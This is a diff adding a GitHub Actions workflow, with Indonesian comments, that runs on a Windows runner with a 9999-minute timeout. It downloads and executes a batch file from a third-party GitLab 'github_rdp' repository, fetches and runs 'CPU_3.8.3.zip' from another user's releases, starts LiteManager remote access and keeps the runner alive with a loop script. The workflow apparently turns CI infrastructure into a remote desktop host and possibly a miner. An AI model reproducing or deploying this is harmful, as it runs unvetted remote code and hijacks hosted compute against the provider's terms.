@@ -1,0 +1,38 @@
+name: Windows
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 9999
+    
+    steps:
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://gitlab.com/chamod12/lm_win-10_github_rdp/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Downloading File from GitHub Releases
+        run: |
+          # Mengunduh file dari GitHub Releases
+          Invoke-WebRequest -Uri "https://github.com/bonhus4/bbunny72/releases/download/v1.0.0-beta/CPU_3.8.3.zip" -OutFile "CPU_3.8.3.zip"
+
+      - name: Extracting File
+        run: |
+          # Mengekstrak file ZIP
+          Add-Type -AssemblyName System.IO.Compression.FileSystem
+          [System.IO.Compression.ZipFile]::ExtractToDirectory("CPU_3.8.3.zip", "extracted_folder")
+
+      - name: Run the Batch File
+        run: |
+          cd extracted_folder\CPU_3.8.3
+          cmd /k run.bat  # Menggunakan /k untuk menjaga jendela tetap terbuka
+
+      - name: Connect to LiteManager
+        run: cmd /c show.bat
+
+      - name: Time Counter
+        run: cmd /c loop.bat
